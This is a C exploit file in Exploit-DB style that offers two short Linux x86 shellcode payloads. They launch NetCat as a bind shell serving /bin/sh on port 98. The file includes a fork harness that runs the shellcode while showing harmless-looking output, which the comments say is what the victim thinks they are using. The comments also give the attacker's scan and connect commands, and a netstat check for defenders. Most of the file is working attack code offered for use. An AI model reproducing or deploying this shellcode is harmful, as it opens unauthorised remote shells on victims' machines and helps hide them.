#include <stdio.h>
#include <string.h>
#include <unistd.h> //| needed for C "fork"
#include <stdlib.h> //| needed for C "system"


//| Exploit Title: [Linux x86 NetCat bind shell with Port (44, 52 bytes)]
//| Date: [7/28/2016]
//| Exploit Author: [CripSlick]
//| Tested on: [Kali 2.0 x86]
//| Version: [NetCat v1.10-41]

//| ShepherdDowling@gmail.com
//| OffSec ID: OS-20614
//| http://50.112.22.183/


//|=====================================================================================================
//|================================ CripSlick's Short NetCat Bind Shell ================================
//|
//|
//|	Why use CripSlick's NetCat Bind Shell?
//|	Because it is short and that is about the only reason. If you can spare some bytes, I highly
//|	suggest that you go with my Ncat Bind Shell that has the added benefits of SSL, persistent,
//|	multi-terminal with a password >>>>>>>>>>>>>>	https://www.exploit-db.com/exploits/40061/
//|	Or if you must only rely on syscalls, go >>>> 	https://www.exploit-db.com/exploits/40122/
//|	for my bind shell that is also, persistent, multiterminal with a password (Ncat is better
//|	due to SSL, so if you know the victim has it on their machine use it.)
//|
//|
//|	Sometimes we don't have the luxury of being able to have the other goodies so you must make do
//|	with a less powerful approach to at least get your foot in the door, and that is why I made this.
//|
//|	Defender Bash Script
//|	netstat -an | grep -A 50 Recv-Q | egrep "tcp|udp"
//|
//|	I came up with this bash script because I wanted to be able to see who was spying that included
//|	TCP listening, TCP established, UDP listening, & UDP established.
//|	I found it annoying that some people needed to run a new script for every state so I fixed that.
//|	the "-A 50" means your bash script will hold up to 50 connections.
//|	If you need more connections increase the number, and if the scan is slow, decrease the number.




#define PORT 		"\x39\x38"	// FORWARD BYTE ORDER (ASCII TO HEX)
//|					PORT:98

//| Specifying the PROTOCOL Only Applies to CODE2
//#define PROTOCOL	"\x76\x76"	// TCP & IS terminal visible
#define PROTOCOL	"\x75\x75"	// UDP & NOT terminal visible

//|=====================!!!CHOSE ONLY ONE SHELLCODE!!!============================
//| ==============================================================================
//| CODE1 Random Port, real ghetto but only 44 bytes!!
//| ==============================================================================
//| Attacker Finds Port: nmap 10.1.1.4 -p-
//| Attacker Connects via TCP: nc <IP> <PORT>
//| Defender : netstat -an | grep -A 50 Recv-Q | egrep "tcp|udp"


unsigned char CODE1[] = //replace CODE1 for both CODEX   <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<

"\x31\xc0\x31\xd2\x50\x68\x6e\x2f\x73\x68\x68\x65\x2f\x62\x69\x68\x2d"
"\x6c\x76\x76\x89\xe6\x50\x68\x2f\x2f\x6e\x63\x68\x2f\x62\x69\x6e\x89"
"\xe3\x50\x56\x53\x89\xe1\xb0\x0b\xcd\x80"
;


//|=====================!!!CHOSE ONLY ONE SHELLCODE!!!============================
//| ==============================================================================
//| CODE2 with port and still only 52 bytes
//| ==============================================================================
//| Attacker Connects via TCP: nc <IP> <PORT>
//| Attacker Connects via UDP: nc -u <IP> <PORT>
//| Defender : netstat -an | grep -A 50 Recv-Q | egrep "tcp|udp"


unsigned char CODE2[] = //replace CODE2 for both CODEX   <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<


"\x31\xdb\xf7\xe3\x68\x2d\x70"PORT"\x89\xe7\x50\x68\x6e\x2f\x73\x68\x68"
"\x65\x2f\x62\x69\x68\x2d\x6c"PROTOCOL"\x89\xe6\x50\x68\x2f\x2f\x6e\x63"
"\x68\x2f\x62\x69\x6e\x89\xe3\x50\x57\x56\x53\x89\xe1\xb0\x0b\xcd\x80"
;



//|========================== VOID SHELLCODE ======================================
void SHELLCODE()
{
//	This part floods the registers to make sure the shellcode will always run
	__asm__("mov $0xAAAAAAAA, %eax\n\t"
		"mov %eax, %ebx\n\t" "mov %eax, %ecx\n\t" "mov %eax, %edx\n\t"
		"mov %eax, %esi\n\t" "mov %eax, %edi\n\t" "mov %eax, %ebp\n\t"
		"call CODE2");  //1st CODEX<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>
}

//|========================== VOID printBytes =====================================
void printBytes()
{
printf("CripSlick's code is %d Bytes Long\n",
		strlen(CODE2)); //2nd CODEX<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>
}


//|============================== Int main ========================================
int main ()
{

//	IMPORTANT> replace CODEX  the "unsigned char" variable  above
//	> This needs to be done twice (for string count + code to use)

int pid = fork();  		// fork start
    if(pid == 0){ 		// pid always starts at 0

	SHELLCODE();		// launch void SHELLCODE
						// this is to represent a scenario where you bind to a good program
						// you always want your shellcode to run first

	}else if(pid > 0){	// pid will always be greater than 0 after the 1st process
						// this argument will always be satisfied

	printBytes();		// launch printBYTES
						// pretend that this is the one the victim thinks he is only using
	}
return 0;				// satisfy int main
system("exit");			// keeps our shellcode a daemon. This only works with C0DE2 as UDP
}